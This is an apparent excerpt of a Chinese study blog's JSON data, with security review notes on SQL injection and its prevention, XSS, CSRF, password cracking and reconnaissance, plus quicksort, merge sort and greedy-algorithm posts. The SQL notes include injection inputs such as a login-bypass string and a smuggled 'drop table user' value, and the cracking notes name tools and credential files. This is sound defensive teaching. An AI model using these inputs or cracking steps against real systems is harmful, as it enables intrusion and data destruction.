t\\G*************************** 1. row *************************** Table: tCreate Table: CREATE TABLE `t` ( `a` int(11) DEFAULT NULL, `b` varchar(20) DEFAULT NULL, UNIQUE KEY `ab` (`a`,`b`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 （2）编译 我们接下来通过 PREPARE stmt_name FROM preparable_stm的语法来预编译一条sql语句 mysql&gt; prepare ins from ‘insert into t select ?,?’;Query OK, 0 rows affected (0.00 sec)Statement prepared （3）执行 我们通过EXECUTE stmt_name [USING @var_name [, @var_name] ...]的语法来执行预编译语句 1234567891011121314mysql&gt; set @a=999,@b='hello';Query OK, 0 rows affected (0.00 sec) mysql&gt; execute ins using @a,@b;Query OK, 1 row affected (0.01 sec)Records: 1 Duplicates: 0 Warnings: 0 mysql&gt; select * from t;+------+-------+| a | b |+------+-------+| 999 | hello |+------+-------+1 row in set (0.00 sec) 可以看到，数据已经被成功插入表中。 MySQL中的预编译语句作用域是session级，但我们可以通过max_prepared_stmt_count变量来控制全局最大的存储的预编译语句。 mysql&gt; set @@global.max_prepared_stmt_count=1;Query OK, 0 rows affected (0.00 sec)mysql&gt; prepare sel from ‘select * from t’;ERROR 1461 (42000): Can’t create more than max_prepared_stmt_count statements (current value: 1) 当预编译条数已经达到阈值时可以看到MySQL会报如上所示的错误。 （4）释放 如果我们想要释放一条预编译语句，则可以使用{DEALLOCATE | DROP} PREPARE stmt_name的语法进行操作: mysql&gt; deallocate prepare ins;Query OK, 0 rows affected (0.00 sec) 六：为什么PrepareStatement可以防止sql注入 原理是采用了预编译的方法，先将SQL语句中可被客户端控制的参数集进行编译，生成对应的临时变量集，再使用对应的设置方法，为临时变量集里面的元素进行赋值，赋值函数setString()，会对传入的参数进行强制类型检查和安全检查，所以就避免了SQL注入的产生。下面具体分析 （1）：为什么Statement会被sql注入 因为Statement之所以会被sql注入是因为SQL语句结构发生了变化。比如： “select*from tablename where username=’”+uesrname+“‘and password=’”+password+”‘“ 在用户输入’or true or’之后sql语句结构改变。 select*from tablename where username=’’or true or’’ and password=’’ 这样本来是判断用户名和密码都匹配时才会计数，但是经过改变后变成了或的逻辑关系，不管用户名和密码是否匹配该式的返回值永远为true; （2）为什么Preparement可以防止SQL注入。 因为Preparement样式为 select*from tablename where username=? and password=? 该SQL语句会在得到用户的输入之前先用数据库进行预编译，这样的话不管用户输入什么用户名和密码的判断始终都是并的逻辑关系，防止了SQL注入 简单总结，参数化能防注入的原因在于，语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑，至于跑的时候是带一个普通背包还是一个怪物，不会影响行进路线，无非跑的快点与慢点的区别。 七：mybatis是如何防止SQL注入的 1、首先看一下下面两个sql语句的区别：123456&lt;select id=\"selectByNameAndPassword\" parameterType=\"java.util.Map\" resultMap=\"BaseResultMap\"&gt;select id, username, password, rolefrom userwhere username = #&#123;username,jdbcType=VARCHAR&#125;and password = #&#123;password,jdbcType=VARCHAR&#125;&lt;/select&gt; 123456&lt;select id=\"selectByNameAndPassword\" parameterType=\"java.util.Map\" resultMap=\"BaseResultMap\"&gt;select id, username, password, rolefrom userwhere username = $&#123;username,jdbcType=VARCHAR&#125;and password = $&#123;password,jdbcType=VARCHAR&#125;&lt;/select&gt; mybatis中的#和$的区别： **1、#将传入的数据都当成一个字符串，会对自动传入的数据加一个双引号。如：where username=#{username}，如果传入的值是111,那么解析成sql时的值为where username=”111”, 如果传入的值是id，则解析成的sql为where username=”id”. 2、$将传入的数据直接显示生成在sql中。如：where username=${username}，如果传入的值是111,那么解析成sql时的值为where username=111；如果传入的值是;drop table user;，则解析成的sql为：select id, username, password, role from user where username=;drop table user; 3、#方式能够很大程度防止sql注入，$方式无法防止Sql注入。 4、$方式一般用于传入数据库对象，例如传入表名. 5、一般能用#的就别用$，若不得不使用“${xxx}”这样的参数，要手工地做好过滤工作，来防止sql注入攻击。 6、在MyBatis中，“${xxx}”这样格式的参数会直接参与SQL编译，从而不能避免注入攻击。但涉及到动态表名和列名时，只能使用“${xxx}”这样的参数格式。所以，这样的参数需要我们在代码中手工进行处理来防止注入。【结论】在编写MyBatis的映射语句时，尽量采用“#{xxx}”这样的格式。若不得不使用“${xxx}”这样的参数，要手工地做好过滤工作，来防止SQL注入攻击。** mybatis是如何做到防止sql注入的MyBatis框架作为一款半自动化的持久层框架，其SQL语句都要我们自己手动编写，这个时候当然需要防止SQL注入。其实，MyBatis的SQL是一个具有“输入+输出”的功能，类似于函数的结构，参考上面的两个例子。其中，parameterType表示了输入的参数类型，resultType表示了输出的参数类型。回应上文，如果我们想防止SQL注入，理所当然地要在输入参数上下功夫。上面代码中使用#的即输入参数在SQL中拼接的部分，传入参数后，打印出执行的SQL语句，会看到SQL是这样的： select id, username, password, role from user where username=? and password=? 不管输入什么参数，打印出的SQL都是这样的。这是因为MyBatis启用了预编译功能，在SQL执行前，会先将上面的SQL发送给数据库进行编译；执行时，直接使用编译好的SQL，替换占位符“?”就可以了。因为SQL注入只能对编译过程起作用，所以这样的方式就很好地避免了SQL注入的问题。 【底层实现原理】MyBatis是如何做到SQL预编译的呢？其实在框架底层，是JDBC中的PreparedStatement类在起作用，PreparedStatement是我们很熟悉的Statement的子类，它的对象包含了编译好的SQL语句。这种“准备好”的方式不仅能提高安全性，而且在多次执行同一个SQL时，能够提高效率。原因是SQL已编译好，再次执行时无需再编译 Xss跨站脚本攻击分类： 反射型xss 存储型xss dom型xss 反射型，攻击者需要构造含有xss脚本的URL发给受害者，诱使受害者点击链接，服务器会返回带有xss脚本的数据，这时候攻击者可以窃取相关用户数据。 存储型，xss代码被存到服务器，常见于博客，论坛，留言板之类的，允许用户输入各种字符的文本数据。 DOM型，不需要和服务器进行交互，由客户端浏览器解析既可触发。不正确的使用了js的各种dom方法。 防御xss攻击服务器向客户端返回数据的时候进行编码（html编码），使用上下文敏感数据编码。 CSRF攻击CSRF攻击是一种针对网站的恶意利用。在用户不知情的情况下，冒充合法用户去发送请求给网站，是用受信任的用户攻击受信任的网站，而XSS则是利用受信任的站点攻击用户。 CSRF攻击主要需要满足两个条件 用户登陆某个网站，获得授权 目标用户访问了攻击者构造的URL 分类： GET型 POST型 攻击者伪造一些post请求，诱使用户点击，会携带合法的cookie向服务器发送post请求。 CSRF的防御 增加二次验证机制 校验referrer字段，保证相关敏感操作来自授权站点的跳转。 在敏感操作的参数中，增加完全随机的token参数进行校验","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全复习笔记—口令破解与防御","slug":"网络安全复习笔记—口令破解与防御","date":"2020-11-27T03:09:29.000Z","updated":"2020-12-03T13:57:27.580Z","comments":true,"path":"2020/11/27/koulingpojie/","link":"","permalink":"http://aotle.top/2020/11/27/koulingpojie/","excerpt":"复习笔记——口令破解与防御","text":"复习笔记——口令破解与防御 常用口令破解技术 暴力破解 字典攻击 组合攻击 社会工程学 暴力破解 彩虹表：https://www.jianshu.com/p/732d9d960411 彩虹表类似字典攻击，但是不是简单的存储明文密钥对。而是采用哈希链来存储，优化一定空间。 字典攻击弱口令和根据用户信息生成的字典进行攻击。 组合攻击组合攻击就是在字典攻击的基础上，增添几个数字几个字母啥的，防止字典没有包含的一些用户口令。 社会工程学简而言之就是骗，进行钓鱼。常用工具kali系统的set(social engineering toolkit) 操作系统口令破解Windows系统口令文件通过sam文件保存单向散列值。通过安全标示对口令进行管理，安全标示是唯一的，即使删除用户再使用同样的用户名进行创建也会使用不同的安全标示。 Windows下的两种hash算法 Lm-hash（暴力破解即可，不安全） Not-hash（微软改进的算法） 这种算法相对来说比较简单，将用户口令进行unicode编码，在进行md4转换得到hash值。 Windows用户登陆和身份验证 交互式登陆 直接通过本地计算机登陆，将密码按照加密过程走一遍，对比hash值即可。 网络登陆 网络登陆涉及多种身份认证机制。该章节介绍了htlm机制。 先把用户口令进行加密，得到hash值，明文则被丢弃，服务器发送一段16位的随机序列，用户对这段序列用hash值进行加密，然后把加密的信息发过去，服务器进行同样进行一遍加密过程，如果得到结果相同，则通过，否则不通过。 Linux口令/etc/passwd存放用户id等信息，而加密的口令存放在/etc/shadow中，密钥以$进行分割，第一段写的是加密算法对应的标号，第二段放的是盐值，第三段放的是密钥。 组口令放在/etc/group文件中，口令信息放在/etc/shadow中。 操作系统口令破解Windows口令破解 Windows运行过程sam文件被锁定，可以通过系统漏洞获取sam文件。得到sam文件之后只需要进行口令破解即可。 常用工具：pwdump，l0phtcrack等 linux口令破解 先要获取root权限，在获取/etc/shadow文件，在进行破解。 常见工具：john the ripper 数据库口令破解 mysql数据库的user表中放了用户口令等信息，获取该表之后通过工具破解即可。 口令防御技术使用强口令，定期更换等。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全复习笔记—概论与信息收集","slug":"网络安全复习笔记—概论与信息收集","date":"2020-11-18T02:21:53.000Z","updated":"2020-12-03T13:56:35.775Z","comments":true,"path":"2020/11/18/xinxishouji/","link":"","permalink":"http://aotle.top/2020/11/18/xinxishouji/","excerpt":"网络安全复习笔记一概论与信息收集","text":"网络安全复习笔记一概论与信息收集 概论网络安全的概念基本属性：CIA三元组 机密性 完整性 可用性 安全威胁 信息泄露 信息破坏 拒绝服务 网络攻击 阻断攻击 截取攻击 篡改攻击 未遭攻击 重放攻击 网络安全体系结构 风险分析 安全策略 安全服务 安全机制 安全服务与安全机制的关系 安全模型$$P^2DR$$ 策略 保护 检测 响应 $$PDRR$$ 保护 检测 响应 恢复 $$P^2DR^2$$ 策略 防护 检测 响应 恢复 网络安全等级保护 网络安全等级保护的概念 网络安全等级保护相关标准 网络安全等级保护的等级划分准则 第一级：用户自主保护级 第二级：系统审计保护级 第三级：安全标记保护级 第四级：结构化保护级 第五级：访问验证保护级 网络安全等级保护基本要求 概论一堆概念，推测不会考 信息收集和渗透测试攻击流程攻击流程大致分为：踩点，扫描，查点，访问，提权，窃取信息，湮灭踪迹，创建后门，拒绝服务。 踩点 公开信息源搜索 通过公开渠道得到信息，Google高级搜索，Maltego工具。 whois查询 查询域名是否被注册，可以查到注册机构，注册机构信息，域名，网络信息（例如IP地址），联系信息。 DNS查询 常用工具dig和系统命令nslookup命令。 网络侦察 Windows下的tracert命令和Linux下的traceroute命令 扫描获取目标系统是否开机，运行和监听的服务，操作系统的类型等信息。常见的工具NMAP，superscan。 查点攻击实施阶段攻击善后阶段","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://aotle.top/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"图解快速排序","slug":"图解快速排序","date":"2020-11-09T13:58:15.000Z","updated":"2020-11-28T08:57:03.823Z","comments":true,"path":"2020/11/09/kuaipaitujie/","link":"","permalink":"http://aotle.top/2020/11/09/kuaipaitujie/","excerpt":"转载自：https://www.sohu.com/a/246785807_684445?qq-pf-to=pcqq.group","text":"转载自：https://www.sohu.com/a/246785807_684445?qq-pf-to=pcqq.group ————— 第二天 ————— ———————————— 同冒泡排序一样，快速排序也属于交换排序，通过元素之间的比较和交换位置来达到排序的目的。 不同的是，冒泡排序在每一轮只把一个元素冒泡到数列的一端，而快速排序在每一轮挑选一个基准元素，并让其他比它大的元素移动到数列一边，比它小的元素移动到数列的另一边，从而把数列拆解成了两个部分。 这种思路就叫做分治法。 每次把数列分成两部分，究竟有什么好处呢？ 假如给定8个元素的数列，一般情况下冒泡排序需要比较8轮，每轮把一个元素移动到数列一端，时间复杂度是O（n^2）。 而快速排序的流程是什么样子呢？ 如图所示，在分治法的思想下，原数列在每一轮被拆分成两部分，每一部分在下一轮又分别被拆分成两部分，直到不可再分为止。 这样一共需要多少轮呢？平均情况下需要logn轮，因此快速排序算法的平均时间复杂度是 O（nlogn）。 基准元素的选择 基准元素，英文pivot，用于在分治过程中以此为中心，把其他元素移动到基准元素的左右两边。 那么基准元素如何选择呢？ 最简单的方式是选择数列的第一个元素： 这种选择在绝大多数情况是没有问题的。但是，假如有一个原本逆序的数列，期望排序成顺序数列，那么会出现什么情况呢？ ………. 我们该怎么避免这种情况发生呢？ 其实很简单，我们可以不选择数列的第一个元素，而是随机选择一个元素作为基准元素。 这样一来，即使在数列完全逆序的情况下，也可以有效地将数列分成两部分。 当然，即使是随机选择基准元素，每一次也有极小的几率选到数列的最大值或最小值，同样会影响到分治的效果。 所以，快速排序的平均时间复杂度是 O（n**logn），最坏情况下的时间复杂度是 **O（n^2）。 元素的移动 选定了基准元素以后，我们要做的就是把其他元素当中小于基准元素的都移动到基准元素一边，大于基准元素的都移动到基准元素另一边。 具体如何实现呢？有两种方法： 1.挖坑法 2.指针交换法 何谓挖坑法？我们来看一看详细过程。 给定原始数列如下，要求从小到大排序： 首先，我们选定基准元素Pivot，并记住这个位置index，这个位置相当于一个“坑”。并且设置两个指针left和right，指向数列的最左和最右两个元素： 接下来，从right指针开始，把指针所指向的元素和基准元素做比较。如果比pivot大，则right指针向左移动；如果比pivot小，则把right所指向的元素填入坑中。 在当前数列中，1&lt;4，所以把1填入基准元素所在位置，也就是坑的位置。这时候，元素1本来所在的位置成为了新的坑。同时，left向右移动一位。 此时，left左边绿色的区域代表着小于基准元素的区域。 接下来，我们切换到left指针进行比较。如果left指向的元素小于pivot，则left指针向右移动；如果元素大于pivot，则把left指向的元素填入坑中。 在当前数列中，7&gt;4，所以把7填入index的位置。这时候元素7本来的位置成为了新的坑。同时，right向左移动一位。 此时，right右边橙色的区域代表着大于基准元素的区域。 下面按照刚才的思路继续排序： 8&gt;4，元素位置不变，right左移 2&lt;4，用2来填坑，left右移，切换到left。 6&gt;4，用6来填坑，right左移，切换到right。 3&lt;4，用3来填坑，left右移，切换到left。 5&gt;4，用5来填坑，right右移。这时候left和right重合在了同一位置。 这时候，把之前的pivot元素，也就是4放到index的位置。此时数列左边的元素都小于4，数列右边的元素都大于4，这一轮交换终告结束。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162public class QuickSort&#123;public static void quickSort(int[] arr, int startIndex, int endIndex) &#123; // 递归结束条件：startIndex大等于endIndex的时候 if (startIndex &gt;= endIndex) &#123; return; &#125; // 得到基准元素位置 int pivotIndex = partition(arr, startIndex, endIndex); // 用分治法递归数列的两部分 quickSort(arr, startIndex, pivotIndex - 1); quickSort(arr, pivotIndex + 1, endIndex); &#125;private static int partition(int[] arr, int startIndex, int endIndex) &#123; // 取第一个位置的元素作为基准元素 int pivot = arr[startIndex]; int left = startIndex; int right = endIndex; // 坑的位置，初始等于pivot的位置 int index = startIndex; //大循环在左右指针重合或者交错时结束 while (right &gt;= left) &#123; //right指针从右向左进行比较 while (right &gt;= left) &#123; if (arr[right] &lt; pivot) &#123; arr[left] = arr[right]; index = right; left++; break; &#125; right--; &#125; //left指针从左向右进行比较 while (right &gt;= left) &#123; if (arr[left] &gt; pivot) &#123; arr[right] = arr[left]; index = left; right--; break; &#125; left++; &#125; &#125; arr[index] = pivot; return index; &#125;public static void main(String[] args) &#123; int[] arr = new int[]&#123;4, 7, 6, 5, 3, 2, 8, 1&#125;; quickSort(arr, 0, arr.length - 1); System.out.println(Arrays.toString(arr)); &#125;&#125; 代码中，quickSort方法通过递归的方式，实现了分而治之的思想。 partition方法则实现元素的移动，让数列中的元素依据自身大小，分别移动到基准元素的左右两边。在这里，我们使用移动方式是挖坑法。 指针交换法 何谓指针交换法？我们来看一看详细过程。 给定原始数列如下，要求从小到大排序： 开局和挖坑法相似，我们首先选定基准元素Pivot，并且设置两个指针left和right，指向数列的最左和最右两个元素： 接下来是第一次循环，从right指针开始，把指针所指向的元素和基准元素做比较。如果大于等于pivot，则指针向左移动；如果小于pivot，则right指针停止移动，切换到left指针。 在当前数列中，1&lt;4，所以right直接停止移动，换到left指针，进行下一步行动。 轮到left指针行动，把指针所指向的元素和基准元素做比较。如果小于等于pivot，则指针向右移动；如果大于pivot，则left指针停止移动。 由于left一开始指向的是基准元素，判断肯定相等，所以left右移一位。 由于7 &gt; 4，left指针在元素7的位置停下。这时候，我们让left和right指向的元素进行交换。 接下来，我们进入第二次循环，重新切换到right向左移动。right先移动到8，8&gt;2，继续左移。由于2&lt;8，停止在2的位置。 切换到left，6&gt;4，停止在6的位置。 元素6和2交换。 进入第三次循环，right移动到元素3停止，left移动到元素5停止。 元素5和3交换。 进入第四次循环，right移动到元素3停止，这时候请注意，left和right指针已经重合在了一起。 当left和right指针重合之时，我们让pivot元素和left与right重合点的元素进行交换。此时数列左边的元素都小于4，数列右边的元素都大于4，这一轮交换终告结束。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455public class QuickSort&#123;public static void quickSort(int[] arr, int startIndex, int endIndex) &#123; // 递归结束条件：startIndex大等于endIndex的时候 if (startIndex &gt;= endIndex) &#123; return; &#125; // 得到基准元素位置 int pivotIndex = partition(arr, startIndex, endIndex); // 根据基准元素，分成两部分递归排序 quickSort(arr, startIndex, pivotIndex - 1); quickSort(arr, pivotIndex + 1, endIndex); &#125;private static int partition(int[] arr, int startIndex, int endIndex) &#123; // 取第一个位置的元素作为基准元素 int pivot = arr[startIndex]; int left = startIndex; int right = endIndex; while (left != right) &#123; //控制right指针比较并左移 while (left &lt; right &amp;&amp; arr[right] &gt; pivot) &#123; right--; &#125; //控制right指针比较并右移 while (left &lt; right &amp;&amp; arr[left] &lt;= pivot) &#123; left++; &#125; //交换left和right指向的元素 if (left &lt; right) &#123; int p = arr[left]; arr[left] = arr[right]; arr[right] = p; &#125; &#125; //pivot和指针重合点交换 int p = arr[left]; arr[left] = arr[startIndex]; arr[startIndex] = p; return left; &#125;public static void main(String[] args) &#123; int[] arr = new int[]&#123;4, 7, 6, 5, 3, 2, 8, 1&#125;; quickSort(arr, 0, arr.length - 1); System.out.println(Arrays.toString(arr)); &#125;&#125; 和挖坑法相比，指针交换法在partition方法中进行的元素交换次数更少。 非递归实现 为什么这样说呢？ 因为我们代码中一层一层的方法调用，本身就是一个函数栈。每次进入一个新方法，就相当于入栈；每次有方法返回，就相当于出栈。 所以，我们可以把原本的递归实现转化成一个栈的实现，在栈当中存储每一次方法调用的参数： 下面我们来看一下代码： public class QuickSortWithStack { } 和刚才的递归实现相比，代码的变动仅仅在quickSort方法当中。该方法中引入了一个存储Map类型元素的栈，用于存储每一次交换时的起始下标和结束下标。 每一次循环，都会让栈顶元素出栈，进行排序，并且按照基准元素的位置分成左右两部分，左右两部分再分别入栈。当栈为空时，说明排序已经完毕，退出循环。 几点补充： 本漫画纯属娱乐，还请大家尽量珍惜当下的工作，切勿模仿小灰的行为哦。","categories":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"归并排序","slug":"归并排序","date":"2020-11-09T13:52:59.000Z","updated":"2020-11-30T11:06:41.341Z","comments":true,"path":"2020/11/09/guibingpaixu1/","link":"","permalink":"http://aotle.top/2020/11/09/guibingpaixu1/","excerpt":"转载自：https://www.cnblogs.com/chengxiao/p/6194356.html","text":"转载自：https://www.cnblogs.com/chengxiao/p/6194356.html 基本思想 归并排序（MERGE-SORT）是利用归并的思想实现的排序方法，该算法采用经典的分治（divide-and-conquer）策略（分治法将问题分(divide)成一些小的问题然后递归求解，而治(conquer)的阶段则将分的阶段得到的各答案”修补”在一起，即分而治之)。 分而治之 可以看到这种结构很像一棵完全二叉树，本文的归并排序我们采用递归去实现（也可采用迭代的方式去实现）。分阶段可以理解为就是递归拆分子序列的过程，递归深度为log2n。 合并相邻有序子序列 再来看看治阶段，我们需要将两个已经有序的子序列合并成一个有序序列，比如上图中的最后一次合并，要将[4,5,7,8]和[1,2,3,6]两个已经有序的子序列，合并为最终序列[1,2,3,4,5,6,7,8]，来看下实现步骤。 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package sortdemo;import java.util.Arrays;/** * Created by chengxiao on 2016/12/8. */public class MergeSort &#123; public static void main(String []args)&#123; int []arr = &#123;9,8,7,6,5,4,3,2,1&#125;; sort(arr); System.out.println(Arrays.toString(arr)); &#125; public static void sort(int []arr)&#123; int []temp = new int[arr.length];//在排序前，先建好一个长度等于原数组长度的临时数组，避免递归中频繁开辟空间 sort(arr,0,arr.length-1,temp); &#125; private static void sort(int[] arr,int left,int right,int []temp)&#123; if(left&lt;right)&#123; int mid = (left+right)/2; sort(arr,left,mid,temp);//左边归并排序，使得左子序列有序 sort(arr,mid+1,right,temp);//右边归并排序，使得右子序列有序 merge(arr,left,mid,right,temp);//将两个有序子数组合并操作 &#125; &#125; private static void merge(int[] arr,int left,int mid,int right,int[] temp)&#123; int i = left;//左序列指针 int j = mid+1;//右序列指针 int t = 0;//临时数组指针 while (i&lt;=mid &amp;&amp; j&lt;=right)&#123; if(arr[i]&lt;=arr[j])&#123; temp[t++] = arr[i++]; &#125;else &#123; temp[t++] = arr[j++]; &#125; &#125; while(i&lt;=mid)&#123;//将左边剩余元素填充进temp中 temp[t++] = arr[i++]; &#125; while(j&lt;=right)&#123;//将右序列剩余元素填充进temp中 temp[t++] = arr[j++]; &#125; t = 0; //将temp中的元素全部拷贝到原数组中 while(left &lt;= right)&#123; arr[left++] = temp[t++]; &#125; &#125;&#125; 执行结果 1[1, 2, 3, 4, 5, 6, 7, 8, 9] 最后 归并排序是稳定排序，它也是一种十分高效的排序，能利用完全二叉树特性的排序一般性能都不会太差。java中Arrays.sort()采用了一种名为TimSort的排序算法，就是归并排序的优化版本。从上文的图中可看出，每次合并操作的平均时间复杂度为O(n)，而完全二叉树的深度为|log2n|。总的平均时间复杂度为O(nlogn)。而且，归并排序的最好，最坏，平均时间复杂度均为O(nlogn)。","categories":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"贪心算法","slug":"贪心算法","date":"2020-11-09T00:49:41.000Z","updated":"2020-12-03T13:55:38.601Z","comments":true,"path":"2020/11/09/tanxin/","link":"","permalink":"http://aotle.top/2020/11/09/tanxin/","excerpt":"贪心算法的复习","text":"贪心算法的复习 哈夫曼编码题目描述给定一只含有小写字母的字符串；输出其哈夫曼编码的长度 输入第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500. 输出对于每个字符串，输出其哈夫曼编码长度 样例输入12343hrvshlcxeasexdphiopdmntflolfbtbpplahqolqykrqdnwdoq 样例输出1231051115 思路哈夫曼编码的思路不难，主要讲一下优先级队列的使用。 在STL里有这个priority_queue，实现优先队列的结构，在优先队列中，优先级高的元素先出队列。 模板声明(3个参数)：priority_queue&lt;Type, Container, Functional&gt; Type 为数据类型 Container 为保存数据的容器， 必须是用数组实现的容器，比如 vector、 deque 但不能用 list。默认用的是 vector Functional 为元素比较方式，默认用 operator&lt; , 即队头元素最大。 所以如果后面俩个参数缺省的话，优先队列就是大顶堆，队头元素最大。 如果要用到小顶堆，则一般要把模板的三个参数都带进去。STL里面定义了一个仿函数 greater&lt;&gt;，对于基本类型可以用这个仿函数声明小顶堆priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt; &gt;q;，即队头元素最小。对于自定义类型，则必须自己重载 operator&lt; 或者自己写比较函数。 优先级队列的几个操作： empty() 如果优先队列为空，则返回真 pop() 删除第一个元素 push() 插入一个元素 size() 返回优先队列中拥有的元素的个数 top()返回优先队列中有最高优先级的元素 代码1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;#include&lt;queue&gt;#include&lt;string.h&gt;using namespace std;int main() &#123; int T; cin &gt;&gt; T; while (T--) &#123; char s[1505]; //存放每个字母的频率 int n[26] = &#123;0&#125;; cin &gt;&gt; s; for (int i = 0; i &lt; strlen(s); i++) &#123; n[s[i] - 'a']++; &#125; //建立一个优先级队列 priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; q; for (int i = 0; i &lt; 26; i++) &#123; if (n[i] &gt; 0) q.push(n[i]); &#125; int sum = 0; //不断更新优先级队列 while (q.size() &gt;= 2) &#123; int a = q.top(); q.pop(); int b = q.top(); q.pop(); int temp = a + b; q.push(temp); sum += temp; &#125; cout &lt;&lt; sum &lt;&lt; endl; &#125; return 0; &#125; Homework题目描述临近开学了，大家都忙着收拾行李准 备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。 暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。 I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。 现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。 输入测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。 输出对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位 提示：float 的精度可能不够，你应该使用 double 类型。 样例输入1234564 204 105 2210 31 20 0 样例输出137.00 思路背包类的贪心算法，计算物品性价比，按性价比从大到小排序，优先装入性价比大的，直到容量满为止。 0-1背包，物体不能拆分；背包，物体可以拆分。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;algorithm&gt;#include &lt;iomanip&gt;#include &lt;iostream&gt;#include &lt;queue&gt;#include &lt;string.h&gt;using namespace std;struct zuoye&#123; double w; double v; double avg;&#125; z[25];bool cmp(zuoye a, zuoye b)&#123; return a.avg &gt; b.avg;&#125;int main()&#123; int n, t; while (cin &gt;&gt; n &gt;&gt; t &amp;&amp; (n || t)) //注意这里n,t不同时为0，但是可以个别为0 &#123; for (int i = 0; i &lt; n; ++i) &#123; cin &gt;&gt; z[i].w &gt;&gt; z[i].v; z[i].avg = z[i].v / z[i].w; &#125; sort(z, z + n, cmp); double sum = 0; for (int i = 0; i &lt; n; ++i) &#123; if (t &gt;= z[i].w) &#123; t = t - z[i].w; sum += z[i].v; &#125; else &#123; sum += t * z[i].avg; break; &#125; &#125; printf(\"%.2f\\n\", sum); //cout &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(2) &lt;&lt; sum &lt;&lt; endl; &#125; return 0;&#125; 问题 D: 海之征途——孙策题目描述孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。 现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。 输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。 样例输入12345210 43 5 2 420 93 5 2 4 6 1 8 5 9 样例输出1236 提示1.小朋友的体重可能相同 2.船可以满载 思路贪心算法，先对小朋友按体重升序排列，然后体重小的优先上船，直到容量满为止。 代码1234567891011121314151617181920212223242526272829#include &lt;bits/stdc++.h&gt;using namespace std;const int maxn = 1005;int t, m, n;int w[maxn];int main()&#123; cin &gt;&gt; t; while (t--) &#123; cin &gt;&gt; m &gt;&gt; n; for (int i = 0; i &lt; n; i++) &#123; cin &gt;&gt; w[i]; &#125; sort(w, w + n); int ans = 0, c = m; for (int i = 0; i &lt; n; i++) &#123; if (w[i] &lt;= c) &#123; ans++; c -= w[i]; &#125; &#125; cout &lt;&lt; ans &lt;&lt; endl; &#125; return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"贪心算法","slug":"贪心算法","permalink":"http://aotle.top/tags/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"}]},{"title":"STL函数总结（持续更新）","slug":"STL函数总结（持续更新）","date":"2020-11-08T14:14:49.000Z","updated":"2020-12-03T13:51:26.216Z","comments":true,"path":"2020/11/08/STLku/","link":"","permalink":"http://aotle.top/2020/11/08/STLku/","excerpt":"STL函数总结，用到不熟悉的再总结吧","text":"STL函数总结，用到不熟悉的再总结吧 algorithmlower_bound():头文件： #include&lt;algorithm&gt; 函数模板： 如 binary_search() 